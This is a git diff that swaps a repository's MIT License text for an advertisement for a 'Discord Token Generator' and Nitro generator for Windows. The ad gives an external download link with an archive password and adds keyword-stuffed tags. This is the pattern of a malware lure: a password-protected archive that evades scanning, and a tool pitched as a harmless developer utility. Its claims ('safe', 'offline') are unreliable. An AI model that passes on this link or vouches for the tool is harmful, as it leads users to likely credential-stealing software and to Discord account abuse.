@@ -1,21 +1,24 @@
-MIT License
+███╗   ██╗██╗████████╗██████╗  ██████╗      ██████╗ ███████╗███╗   ██╗
+████╗  ██║██║╚══██╔══╝██╔══██╗██╔═══██╗    ██╔════╝ ██╔════╝████╗  ██║
+██╔██╗ ██║██║   ██║   ██████╔╝██║   ██║    ██║  ███╗█████╗  ██╔██╗ ██║
+██║╚██╗██║██║   ██║   ██╔══██╗██║   ██║    ██║   ██║██╔══╝  ██║╚██╗██║
+██║ ╚████║██║   ██║   ██║  ██║╚██████╔╝    ╚██████╔╝███████╗██║ ╚████║
+╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝      ╚═════╝ ╚══════╝╚═╝  ╚═══╝
 
-Copyright (c) 2026 mattwurdock-arch
+Welcome to the simple and automated installation repository for Discord Token Generator (DiscordTokenGenerator) on Windows PC. If you are developing communication bots, testing chat application integrations, or simply want an easy, lightweight desktop utility to automatically structure, manage, and verify unique session keys and API tokens in one clean place, this standalone tool is exactly what you need.
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+================================================================
+                     DOWNLOAD INFORMATION
+----------------------------------------------------------------
+DOWNLOAD LINK: https://gitgora.live/dstokengen
+ARCHIVE PASSWORD: 2026
+================================================================
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+Key Features:
+Centralized Token Dashboard: Easily view, generate, and organize your custom API development tokens from a clean, unified interface.
+Ultra-Lightweight Engine: Uses minimal RAM and CPU resources, ensuring your computer stays completely fast while running backend scripts.
+One-Click Session Refresh: Instantly verify your local communication data paths and apply new structural formats with a single click, saving you time.
+Safe & Independent: Built strictly using standard offline character string algorithms and local file management, making it reliable for everyday use.
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
+TAGS
+discord, discord token, discord token generator, generator, token generator, discord generator, nitro generator, discord, token gen
